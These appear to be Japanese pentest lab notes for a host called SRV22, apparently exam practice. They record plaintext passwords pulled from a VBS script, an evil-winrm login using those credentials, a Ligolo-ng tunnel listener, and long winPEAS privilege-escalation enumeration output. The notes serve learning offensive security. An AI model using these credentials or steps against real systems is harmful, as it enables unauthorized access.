💡`tasks.vbs` にパスワードが平文で存在
```vbscript
strCopy = "SqueakyRedDesk111"
```

tasks.vbsと同じ階層に以下がある。
```sh
a----        2/22/2023   4:16 AM            201 pword_string.vbs
```

まず`pword_string.vbs`というファイルが同じディレクトリにあり、「Insert Password Here」という文字列をクリップボードにコピーするスクリプトだった。
これが「このディレクトリはパスワード管理的な用途に使われている」という先入観を作る。

次に`tasks.vbs`を見たとき、`strCopy`という変数名と`"SqueakyRedDesk111"`という文字列の組み合わせに注目した。`strCopy`自体はただの文字列変数だが、「このスクリプトは何をしているか」と考えると、クリップボードに文字列をコピーするだけの、非常にシンプルで意味のない処理に見える。普通のスクリプトがこんな処理をわざわざファイルに書くのは不自然で、「人間がよく使うパスワードをコピペしやすくするための便利スクリプト」という解釈が自然に浮かんだ。


# 接続

evil-winrm
```powershell
┌──(koshi㉿kali)-[~/PEN-200/AD/SRV22]
└─$ evil-winrm -i 172.16.115.202 -u 'b.martin' -p 'MartiniAllNight222'
```
![[Pasted image 20260110142018.png]]

---

# Listener for file transfer

- use [Ligolo-ng release - Github](https://github.com/nicocha30/ligolo-ng/releases)
- SRV22はkaliに接続できないため、リスナーを用意し、トンネリングする
```zsh
listener_add --addr 0.0.0.0:8888 --to 127.0.0.1:8888 --tcp
```
![[Pasted image 20260110142521.png]]

```zsh
# test
iwr -uri http://172.16.115.206:8888/test.txt -OutFile .\test.txt
```

- これではうまくいかない

- `evil-winrm`で接続しているため、`upload`/`download`コマンドを使う

---

# Local

## Auto w/ WinPEAS

### 転送・実行

```powershell
*Evil-WinRM* PS C:\Users\b.martin> upload winPEASx64.exe

Info: Uploading /home/koshi/PEN-200/AD/SRV22/winPEASx64.exe to C:\Users\b.martin\winPEASx64.exe                                                                
Data: 13561172 bytes of 13561172 bytes copied                                                  
Info: Upload successful!  
```


### 実行結果

```powershell
 [!] If you want to run the file analysis checks (search sensitive information in files), you need to specify the 'fileanalysis' or 'all' argument. Note that this search might take several minutes. For help, run winpeass.exe --help
ANSI color bit for Windows is not set. If you are executing this from a Windows terminal inside the host you should run 'REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1' and then start a new CMD
Long paths are disabled, so the maximum length of a path supported is 260 chars (this may cause false negatives when looking for files). If you are admin, you can enable it with 'REG ADD HKLM\SYSTEM\CurrentControlSet\Control\FileSystem /v VirtualTerminalLevel /t REG_DWORD /d 1' and then start a new CMD
     
               ((((((((((((((((((((((((((((((((
        (((((((((((((((((((((((((((((((((((((((((((
      ((((((((((((((**********/##########(((((((((((((   
    ((((((((((((********************/#######(((((((((((
    ((((((((******************/@@@@@/****######((((((((((
    ((((((********************@@@@@@@@@@/***,####((((((((((
    (((((********************/@@@@@%@@@@/********##(((((((((
    (((############*********/%@@@@@@@@@/************((((((((
    ((##################(/******/@@@@@/***************((((((
    ((#########################(/**********************(((((
    ((##############################(/*****************(((((
    ((###################################(/************(((((
    ((#######################################(*********(((((
    ((#######(,.***.,(###################(..***.*******(((((
    ((#######*(#####((##################((######/(*****(((((
    ((###################(/***********(##############()(((((
    (((#####################/*******(################)((((((
    ((((############################################)((((((
    (((((##########################################)(((((((
    ((((((########################################)(((((((
    ((((((((####################################)((((((((
    (((((((((#################################)(((((((((
        ((((((((((##########################)(((((((((
              ((((((((((((((((((((((((((((((((((((((
                 ((((((((((((((((((((((((((((((

ADVISORY: winpeas should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own devices and/or with the device owner's permission.

  WinPEAS-ng by @hacktricks_live

       /---------------------------------------------------------------------------------\
       |                             Do you like PEASS?                                  |
       |---------------------------------------------------------------------------------| 
       |         Learn Cloud Hacking       :     training.hacktricks.xyz                 |
       |         Follow on Twitter         :     @hacktricks_live                        |
       |         Respect on HTB            :     SirBroccoli                             |
       |---------------------------------------------------------------------------------|
       |                                 Thank you!                                      |
       \---------------------------------------------------------------------------------/

  [+] Legend:
         Red                Indicates a special privilege over an object or something is misconfigured
         Green              Indicates that some protection is enabled or something is well configured
         Cyan               Indicates active users
         Blue               Indicates disabled users
         LightYellow        Indicates links

 You can find a Windows local PE Checklist here: https://book.hacktricks.wiki/en/windows-hardening/checklist-windows-privilege-escalation.html
   Creating Dynamic lists, this could take a while, please wait...
   - Loading sensitive_files yaml definitions file...
   - Loading regexes yaml definitions file...
   - Checking if domain...
   - Getting Win32_UserAccount info...
Error while getting Win32_UserAccount info: System.Management.ManagementException: Access denied 
   at System.Management.ThreadDispatch.Start()
   at System.Management.ManagementScope.Initialize()
   at System.Management.ManagementObjectSearcher.Initialize()
   at System.Management.ManagementObjectSearcher.Get()
   at winPEAS.Checks.Checks.CreateDynamicLists(Boolean isFileSearchEnabled)
   - Creating current user groups list...
   - Creating active users list (local only)...
  [X] Exception: Object reference not set to an instance of an object.
   - Creating disabled users list...
  [X] Exception: Object reference not set to an instance of an object.
   - Admin users list...
  [X] Exception: Object reference not set to an instance of an object.
   - Creating AppLocker bypass list...
   - Creating files/directories list for search...


ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ System Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

ÉÍÍÍÍÍÍÍÍÍÍ¹ Basic System Information
È Check if the Windows versions is vulnerable to some known exploit https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#version-exploits
  [X] Exception: Access denied 
  [X] Exception: Access denied 
  [X] Exception: The given key was not present in the dictionary.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Showing All Microsoft Updates
  [X] Exception: Creating an instance of the COM component with CLSID {B699E5E8-67FF-4177-88B0-3684A3388BFB} from the IClassFactory failed due to the following error: 80070005 Access is denied. (Exception from HRESULT: 0x80070005 (E_ACCESSDENIED)).

ÉÍÍÍÍÍÍÍÍÍÍ¹ System Last Shutdown Date/time (from Registry)

    Last Shutdown Date/time        :    11/1/2024 9:37:00 AM

ÉÍÍÍÍÍÍÍÍÍÍ¹ User Environment Variables
È Check for some passwords or keys in the env variables 
    COMPUTERNAME: SRV22
    PUBLIC: C:\Users\Public
    LOCALAPPDATA: C:\Users\b.martin\AppData\Local
    PSModulePath: C:\Users\b.martin\Documents\WindowsPowerShell\Modules;C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
    PROCESSOR_ARCHITECTURE: AMD64
    Path: C:\Program Files\Common Files\Oracle\Java\javapath;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\b.martin\AppData\Local\Microsoft\WindowsApps
    CommonProgramFiles(x86): C:\Program Files (x86)\Common Files
    ProgramFiles(x86): C:\Program Files (x86)
    PROCESSOR_LEVEL: 6
    ProgramFiles: C:\Program Files
    PATHEXT: .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.CPL
    USERPROFILE: C:\Users\b.martin
    SystemRoot: C:\Windows
    ALLUSERSPROFILE: C:\ProgramData
    DriverData: C:\Windows\System32\Drivers\DriverData
    ProgramData: C:\ProgramData
    PROCESSOR_REVISION: 4f01
    USERNAME: b.martin
    CommonProgramW6432: C:\Program Files\Common Files
    CommonProgramFiles: C:\Program Files\Common Files
    OS: Windows_NT
    PROCESSOR_IDENTIFIER: Intel64 Family 6 Model 79 Stepping 1, GenuineIntel
    ComSpec: C:\Windows\system32\cmd.exe
    SystemDrive: C:
    TEMP: C:\Users\BF116~1.MAR\AppData\Local\Temp
    NUMBER_OF_PROCESSORS: 2
    APPDATA: C:\Users\b.martin\AppData\Roaming
    TMP: C:\Users\BF116~1.MAR\AppData\Local\Temp
    ProgramW6432: C:\Program Files
    windir: C:\Windows
    USERDOMAIN: OSCP
    USERDNSDOMAIN: oscp.exam

ÉÍÍÍÍÍÍÍÍÍÍ¹ System Environment Variables
È Check for some passwords or keys in the env variables 
    ComSpec: C:\Windows\system32\cmd.exe
    DriverData: C:\Windows\System32\Drivers\DriverData
    OS: Windows_NT
    Path: C:\Program Files\Common Files\Oracle\Java\javapath;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\
    PATHEXT: .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
    PROCESSOR_ARCHITECTURE: AMD64
    PSModulePath: C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
    TEMP: C:\Windows\TEMP
    TMP: C:\Windows\TEMP
    USERNAME: SYSTEM
    windir: C:\Windows
    NUMBER_OF_PROCESSORS: 2
    PROCESSOR_LEVEL: 6
    PROCESSOR_IDENTIFIER: Intel64 Family 6 Model 79 Stepping 1, GenuineIntel
    PROCESSOR_REVISION: 4f01

ÉÍÍÍÍÍÍÍÍÍÍ¹ Audit Settings
È Check what is being logged 
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Audit Policy Settings - Classic & Advanced

ÉÍÍÍÍÍÍÍÍÍÍ¹ WEF Settings
È Windows Event Forwarding, is interesting to know were are sent the logs 
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ LAPS Settings
È If installed, local administrator password is changed frequently and is restricted by ACL 
    LAPS Enabled: LAPS not installed

ÉÍÍÍÍÍÍÍÍÍÍ¹ Wdigest
È If enabled, plain-text crds could be stored in LSASS https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#wdigest
    Wdigest is not enabled

ÉÍÍÍÍÍÍÍÍÍÍ¹ LSA Protection
È If enabled, a driver is needed to read LSASS memory (If Secure Boot or UEFI, RunAsPPL cannot be disabled by deleting the registry key) https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#lsa-protection
    LSA Protection is not enabled

ÉÍÍÍÍÍÍÍÍÍÍ¹ Credentials Guard
È If enabled, a driver is needed to read LSASS memory https://book.hacktricks.wiki/windows-hardening/stealing-credentials/credentials-protections#credentials-guard
    CredentialGuard is not enabled

ÉÍÍÍÍÍÍÍÍÍÍ¹ Cached Creds
È If > 0, credentials will be cached in the registry and accessible by SYSTEM user https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#cached-credentials
    cachedlogonscount is 10

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating saved credentials in Registry (CurrentPass)

ÉÍÍÍÍÍÍÍÍÍÍ¹ AV Information
  [X] Exception: Invalid namespace 
    No AV was detected!!
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Windows Defender configuration
  Local Settings
  Group Policy Settings

ÉÍÍÍÍÍÍÍÍÍÍ¹ UAC Status
È If you are in the Administrators group check how to bypass the UAC https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#from-administrator-medium-to-high-integrity-level--uac-bypasss
    ConsentPromptBehaviorAdmin: 0 - No prompting
    EnableLUA: 0
    LocalAccountTokenFilterPolicy: 1
    FilterAdministratorToken: 1
      [*] EnableLUA != 1, UAC policies disabled.
      [+] Any local account can be used for lateral movement.

ÉÍÍÍÍÍÍÍÍÍÍ¹ PowerShell Settings
    PowerShell v2 Version: 2.0
    PowerShell v5 Version: 5.1.17763.1
    PowerShell Core Version: 
    Transcription Settings: 
    Module Logging Settings: 
    Scriptblock Logging Settings: 
    PS history file: 
    PS history size: 

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating PowerShell Session Settings using the registry
      You must be an administrator to run this check

ÉÍÍÍÍÍÍÍÍÍÍ¹ PS default transcripts history
È Read the PS history inside these files (if any)

ÉÍÍÍÍÍÍÍÍÍÍ¹ HKCU Internet Settings
    DisableCachingOfSSLPages: 0
    IE5_UA_Backup_Flag: 5.0
    PrivacyAdvanced: 1
    SecureProtocols: 2688
    User Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
    CertificateRevocation: 1
    ZonesSecurityUpgrade: System.Byte[]

ÉÍÍÍÍÍÍÍÍÍÍ¹ HKLM Internet Settings
    ActiveXCache: C:\Windows\Downloaded Program Files
    CodeBaseSearchPath: CODEBASE
    EnablePunycode: 1
    MinorVersion: 0
    WarnOnIntranet: 1

ÉÍÍÍÍÍÍÍÍÍÍ¹ Drives Information
È Remember that you should search more info inside the other drives 
    C:\ (Type: Fixed)(Filesystem: NTFS)(Available space: 37 GB)(Permissions: Users [Allow: AppendData/CreateDirectories])
    D:\ (Type: CDRom)

ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking WSUS
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#wsus
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking KrbRelayUp
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#krbrelayup
  The system is inside a domain (OSCP) so it could be vulnerable.
È You can try https://github.com/Dec0ne/KrbRelayUp to escalate privileges

ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking If Inside Container
È If the binary cexecsvc.exe or associated service exists, you are inside Docker 
You are NOT inside a container

ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking AlwaysInstallElevated
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#alwaysinstallelevated
    AlwaysInstallElevated isn't available

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerate LSA settings - auth packages included

    auditbasedirectories                 :       0
    auditbaseobjects                     :       0
    Bounds                               :       00-30-00-00-00-20-00-00
    crashonauditfail                     :       0
    fullprivilegeauditing                :       00
    LimitBlankPasswordUse                :       1
    NoLmHash                             :       1
    Security Packages                    :       ""
    Notification Packages                :       rassfm,scecli
    Authentication Packages              :       msv1_0
    LsaPid                               :       644
    LsaCfgFlagsDefault                   :       0
    SecureBoot                           :       1
    ProductType                          :       7
    disabledomaincreds                   :       0
    everyoneincludesanonymous            :       0
    forceguest                           :       0
    restrictanonymous                    :       0
    restrictanonymoussam                 :       1
    SCENoApplyLegacyAuditPolicy          :       0
    TurnOffAnonymousBlock                :       0
    LsaConfigFlags                       :       0
    RunAsPPL                             :       0
    RunAsPPLBoot                         :       0

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating NTLM Settings
  LanmanCompatibilityLevel    :  (Send NTLMv2 response only - Win7+ default)


  NTLM Signing Settings
      ClientRequireSigning    : False
      ClientNegotiateSigning  : True
      ServerRequireSigning    : False
      ServerNegotiateSigning  : False
      LdapSigning             : Negotiate signing (Negotiate signing)

  Session Security
      NTLMMinClientSec        : 536870912 (Require 128-bit encryption)
      NTLMMinServerSec        : 536870912 (Require 128-bit encryption)


  NTLM Auditing and Restrictions
      InboundRestrictions     :  (Not defined)
      OutboundRestrictions    :  (Not defined)
      InboundAuditing         :  (Not defined)
      OutboundExceptions      : 

ÉÍÍÍÍÍÍÍÍÍÍ¹ Display Local Group Policy settings - local users/machine

ÉÍÍÍÍÍÍÍÍÍÍ¹ Potential GPO abuse vectors (applied domain GPOs writable by current user)
  [-] Controlled exception, info about OSCP\b.martin not found
    No obvious GPO abuse via writable SYSVOL paths or GPCO membership detected.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking AppLocker effective policy
   AppLockerPolicy version: 1
   listing rules:



ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating Printers (WMI)

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating Named Pipes
  Name                                                                                                 CurrentUserPerms                                                       Sddl

  eventlog                                                                                             Everyone [Allow: WriteData/CreateFiles]                                O:LSG:LSD:P(A;;0x12019b;;;WD)(A;;CC;;;OW)(A;;0x12008f;;;S-1-5-80-880578595-1860270145-482643319-2788375705-1540778122)

  ROUTER                                                                                               Everyone [Allow: WriteData/CreateFiles]                                O:SYG:SYD:P(A;;0x12019b;;;WD)(A;;0x12019b;;;AN)(A;;FA;;;SY)

  vgauth-service                                                                                       Everyone [Allow: WriteData/CreateFiles]                                O:BAG:SYD:P(A;;0x12019f;;;WD)(A;;FA;;;SY)(A;;FA;;;BA)


ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating AMSI registered providers

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating Sysmon configuration
      You must be an administrator to run this check

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating Sysmon process creation logs (1)
      You must be an administrator to run this check

ÉÍÍÍÍÍÍÍÍÍÍ¹ Installed .NET versions



ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Interesting Events information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

ÉÍÍÍÍÍÍÍÍÍÍ¹ Printing Explicit Credential Events (4648) for last 30 days - A process logged on using plaintext credentials

      You must be an administrator to run this check

ÉÍÍÍÍÍÍÍÍÍÍ¹ Printing Account Logon Events (4624) for the last 10 days.

      You must be an administrator to run this check

ÉÍÍÍÍÍÍÍÍÍÍ¹ Process creation events - searching logs (EID 4688) for sensitive data.

      You must be an administrator to run this check

ÉÍÍÍÍÍÍÍÍÍÍ¹ PowerShell events - script block logs (EID 4104) - searching for sensitive data.

  [X] Exception: Attempted to perform an unauthorized operation.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Displaying Power off/on events for last 5 days

System.UnauthorizedAccessException: Attempted to perform an unauthorized operation.
   at System.Diagnostics.Eventing.Reader.EventLogException.Throw(Int32 errorCode)
   at System.Diagnostics.Eventing.Reader.NativeWrapper.EvtQuery(EventLogHandle session, String path, String query, Int32 flags)
   at System.Diagnostics.Eventing.Reader.EventLogReader..ctor(EventLogQuery eventQuery, EventBookmark bookmark)
   at winPEAS.Helpers.MyUtils.GetEventLogReader(String path, String query, String computerName)
   at winPEAS.Info.EventsInfo.Power.Power.<GetPowerEventInfos>d__0.MoveNext()
   at winPEAS.Checks.EventsInfo.PowerOnEvents()


ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Users Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

ÉÍÍÍÍÍÍÍÍÍÍ¹ Users
È Check if you have some admin equivalent privileges https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#users--groups
  [X] Exception: Object reference not set to an instance of an object.
  Current user: b.martin
  Current groups: Domain Users, Everyone, Builtin\Remote Management Users, Users, Network, Authenticated Users, This Organization, NTLM Authentication
   =================================================================================================

    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Current User Idle Time
   Current User   :     OSCP\b.martin
   Idle Time      :     02h:55m:07s:671ms

ÉÍÍÍÍÍÍÍÍÍÍ¹ Display Tenant information (DsRegCmd.exe /status)
   Tenant is NOT Azure AD Joined.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Current Token privileges
È Check if you can escalate privilege using some enabled token https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#token-manipulation
    SeChangeNotifyPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeIncreaseWorkingSetPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED

ÉÍÍÍÍÍÍÍÍÍÍ¹ Clipboard text

ÉÍÍÍÍÍÍÍÍÍÍ¹ Logged users
  [X] Exception: Access denied 
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Display information about local users
   Computer Name           :   SRV22
   User Name               :   Administrator
   User Id                 :   500
   Is Enabled              :   True
   User Type               :   Administrator
   Comment                 :   Built-in account for administering the computer/domain
   Last Logon              :   1/9/2026 7:05:25 PM
   Logons Count            :   27
   Password Last Set       :   10/9/2024 12:09:27 PM

   =================================================================================================

   Computer Name           :   SRV22
   User Name               :   DefaultAccount
   User Id                 :   503
   Is Enabled              :   False
   User Type               :   Guest
   Comment                 :   A user account managed by the system.
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   1/1/1970 12:00:00 AM

   =================================================================================================

   Computer Name           :   SRV22
   User Name               :   Guest
   User Id                 :   501
   Is Enabled              :   False
   User Type               :   Guest
   Comment                 :   Built-in account for guest access to the computer/domain
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   1/1/1970 12:00:00 AM

   =================================================================================================

   Computer Name           :   SRV22
   User Name               :   jenkins
   User Id                 :   1000
   Is Enabled              :   True
   User Type               :   User
   Comment                 :   
   Last Logon              :   11/13/2024 2:23:46 AM
   Logons Count            :   6
   Password Last Set       :   10/9/2024 12:23:12 PM

   =================================================================================================

   Computer Name           :   SRV22
   User Name               :   WDAGUtilityAccount
   User Id                 :   504
   Is Enabled              :   False
   User Type               :   Guest
   Comment                 :   A user account managed and used by the system for Windows Defender Application Guard scenarios.
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   10/9/2024 2:16:19 PM

   =================================================================================================


ÉÍÍÍÍÍÍÍÍÍÍ¹ RDP Sessions
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Ever logged users
  [X] Exception: Access denied 
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Home folders found
    C:\Users\Administrator
    C:\Users\All Users
    C:\Users\b.martin : b.martin [Allow: AllAccess]
    C:\Users\Default
    C:\Users\Default User
    C:\Users\jenkins
    C:\Users\Public

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for AutoLogon credentials
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Password Policies
È Check for a possible brute-force 
    Domain: Builtin
    SID: S-1-5-32
    MaxPasswordAge: 42.22:47:31.7437440
    MinPasswordAge: 00:00:00
    MinPasswordLength: 0
    PasswordHistoryLength: 0
    PasswordProperties: 0
   =================================================================================================

    Domain: SRV22
    SID: S-1-5-21-1151949782-2971075788-3621847170
    MaxPasswordAge: 42.00:00:00
    MinPasswordAge: 1.00:00:00
    MinPasswordLength: 7
    PasswordHistoryLength: 24
    PasswordProperties: 0
   =================================================================================================


ÉÍÍÍÍÍÍÍÍÍÍ¹ Print Logon Sessions


ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Processes Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

ÉÍÍÍÍÍÍÍÍÍÍ¹ Interesting Processes -non Microsoft-
È Check if any interesting processes for memory dump or if you could overwrite some binary running https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#running-processes
  [X] Exception: Access denied 

ÉÍÍÍÍÍÍÍÍÍÍ¹ Vulnerable Leaked Handlers
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#leaked-handlers
È Getting Leaked Handlers, it might take some time...
[#########-]  97% |                       Handle: 2116(key)
    Handle Owner: Pid is 316(winPEASx64) with owner: b.martin
    Reason: AllAccess
    Registry: HKLM\software\microsoft\windows\currentversion\explorer\folderdescriptions\{1ac14e77-02e7-4e5d-b744-2eb1ae5198b7}\propertybag
   =================================================================================================



ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Services Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
  [X] Exception: Cannot open Service Control Manager on computer '.'. This operation might require other privileges.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Interesting Services -non Microsoft-
È Check if you can overwrite some service binary or perform a DLL hijacking, also check for unquoted paths https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#services
  [X] Exception: Access denied 
    @arcsas.inf,%arcsas_ServiceName%;Adaptec SAS/SATA-II RAID Storport's Miniport Driver(PMC-Sierra, Inc. - @arcsas.inf,%arcsas_ServiceName%;Adaptec SAS/SATA-II RAID Storport's Miniport Driver)[System32\drivers\arcsas.sys] - Boot
   =================================================================================================

    @netbvbda.inf,%vbd_srv_desc%;QLogic Network Adapter VBD(QLogic Corporation - @netbvbda.inf,%vbd_srv_desc%;QLogic Network Adapter VBD)[System32\drivers\bxvbda.sys] - Boot
   =================================================================================================

    @bcmfn2.inf,%bcmfn2.SVCDESC%;bcmfn2 Service(Windows (R) Win 7 DDK provider - @bcmfn2.inf,%bcmfn2.SVCDESC%;bcmfn2 Service)[C:\Windows\System32\drivers\bcmfn2.sys] - System
   =================================================================================================

    @bxfcoe.inf,%BXFCOE.SVCDESC%;QLogic FCoE Offload driver(QLogic Corporation - @bxfcoe.inf,%BXFCOE.SVCDESC%;QLogic FCoE Offload driver)[System32\drivers\bxfcoe.sys] - Boot
   =================================================================================================

    @bxois.inf,%BXOIS.SVCDESC%;QLogic Offload iSCSI Driver(QLogic Corporation - @bxois.inf,%BXOIS.SVCDESC%;QLogic Offload iSCSI Driver)[System32\drivers\bxois.sys] - Boot
   =================================================================================================

    @cht4vx64.inf,%cht4vbd.generic%;Chelsio Virtual Bus Driver(Chelsio Communications - @cht4vx64.inf,%cht4vbd.generic%;Chelsio Virtual Bus Driver)[C:\Windows\System32\drivers\cht4vx64.sys] - System
   =================================================================================================

    @net1ix64.inf,%e1iExpress.Service.DispName%;Intel(R) PRO/1000 PCI Express Network Connection Driver I(Intel Corporation - @net1ix64.inf,%e1iExpress.Service.DispName%;Intel(R) PRO/1000 PCI Express Network Connection Driver I)[C:\Windows\System32\drivers\e1i63x64.sys] - System
   =================================================================================================

    @netevbda.inf,%vbd_srv_desc%;QLogic 10 Gigabit Ethernet Adapter VBD(QLogic Corporation - @netevbda.inf,%vbd_srv_desc%;QLogic 10 Gigabit Ethernet Adapter VBD)[System32\drivers\evbda.sys] - Boot
   =================================================================================================

    @ialpssi_gpio.inf,%iaLPSSi_GPIO.SVCDESC%;Intel(R) Serial IO GPIO Controller Driver(Intel Corporation - @ialpssi_gpio.inf,%iaLPSSi_GPIO.SVCDESC%;Intel(R) Serial IO GPIO Controller Driver)[C:\Windows\System32\drivers\iaLPSSi_GPIO.sys] - System
   =================================================================================================

    @ialpssi_i2c.inf,%iaLPSSi_I2C.SVCDESC%;Intel(R) Serial IO I2C Controller Driver(Intel Corporation - @ialpssi_i2c.inf,%iaLPSSi_I2C.SVCDESC%;Intel(R) Serial IO I2C Controller Driver)[C:\Windows\System32\drivers\iaLPSSi_I2C.sys] - System
   =================================================================================================

    @iastorav.inf,%iaStorAVC.DeviceDesc%;Intel Chipset SATA RAID Controller(Intel Corporation - @iastorav.inf,%iaStorAVC.DeviceDesc%;Intel Chipset SATA RAID Controller)[System32\drivers\iaStorAVC.sys] - Boot
   =================================================================================================

    @iastorv.inf,%*PNP0600.DeviceDesc%;Intel RAID Controller Windows 7(Intel Corporation - @iastorv.inf,%*PNP0600.DeviceDesc%;Intel RAID Controller Windows 7)[System32\drivers\iaStorV.sys] - Boot
   =================================================================================================

    @mlx4_bus.inf,%Ibbus.ServiceDesc%;Mellanox InfiniBand Bus/AL (Filter Driver)(Mellanox - @mlx4_bus.inf,%Ibbus.ServiceDesc%;Mellanox InfiniBand Bus/AL (Filter Driver))[C:\Windows\System32\drivers\ibbus.sys] - System
   =================================================================================================

    Jenkins(Jenkins)["C:\Program Files\Jenkins\jenkins.exe"] - Autoload
    Jenkins Automation Server
   =================================================================================================

    @mlx4_bus.inf,%MLX4BUS.ServiceDesc%;Mellanox ConnectX Bus Enumerator(Mellanox - @mlx4_bus.inf,%MLX4BUS.ServiceDesc%;Mellanox ConnectX Bus Enumerator)[C:\Windows\System32\drivers\mlx4_bus.sys] - System
   =================================================================================================

    @mlx4_bus.inf,%ndfltr.ServiceDesc%;NetworkDirect Service(Mellanox - @mlx4_bus.inf,%ndfltr.ServiceDesc%;NetworkDirect Service)[C:\Windows\System32\drivers\ndfltr.sys] - System
   =================================================================================================

    @oem5.inf,%pvscsi.DiskName%;pvscsi Storage Controller Driver(VMware, Inc. - @oem5.inf,%pvscsi.DiskName%;pvscsi Storage Controller Driver)[System32\drivers\pvscsi.sys] - Boot
   =================================================================================================

    @netqevbda.inf,%vbd_srv_desc%;QLogic FastLinQ Ethernet VBD(Cavium, Inc. - @netqevbda.inf,%vbd_srv_desc%;QLogic FastLinQ Ethernet VBD)[System32\drivers\qevbda.sys] - Boot
   =================================================================================================

    @qefcoe.inf,%QEFCOE.SVCDESC%;QLogic FCoE driver(Cavium, Inc. - @qefcoe.inf,%QEFCOE.SVCDESC%;QLogic FCoE driver)[System32\drivers\qefcoe.sys] - Boot
   =================================================================================================

    @qeois.inf,%QEOIS.SVCDESC%;QLogic 40G iSCSI Driver(QLogic Corporation - @qeois.inf,%QEOIS.SVCDESC%;QLogic 40G iSCSI Driver)[System32\drivers\qeois.sys] - Boot
   =================================================================================================

    @ql2300.inf,%ql2300i.DriverDesc%;QLogic Fibre Channel STOR Miniport Inbox Driver (wx64)(QLogic Corporation - @ql2300.inf,%ql2300i.DriverDesc%;QLogic Fibre Channel STOR Miniport Inbox Driver (wx64))[System32\drivers\ql2300i.sys] - Boot
   =================================================================================================

